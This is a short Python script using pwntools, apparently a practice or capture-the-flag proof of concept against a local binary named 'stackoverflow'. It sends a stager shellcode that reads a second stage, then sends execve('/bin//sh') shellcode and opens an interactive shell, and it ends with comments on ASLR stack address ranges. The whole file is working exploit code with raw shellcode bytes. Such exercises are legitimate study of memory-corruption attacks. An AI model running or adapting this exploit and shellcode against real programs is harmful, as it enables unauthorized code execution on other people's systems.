#!/usr/bin/env python
from pwn import *

context(arch = 'amd64', os = 'linux')
def poc():
    p = process('./stackoverflow')
    
    read_shellcode = '\x50\x48\x89\xe6\x48\x31\xff\xb2\x1c\x0f\x05\x56\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\xe8\xdf\xff\xff\xff\x7f'
    
    
    shell_code = '\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05'
    
    p.sendline(read_shellcode)
    
    sleep(0.1)
    
    p.sendline(shell_code)
    
    p.interactive()
    
if __name__ == '__main__':
    poc()
    
#ASLR
# 7ffc2c8ba000  7ffffffff000

# 7ffd8a3a8000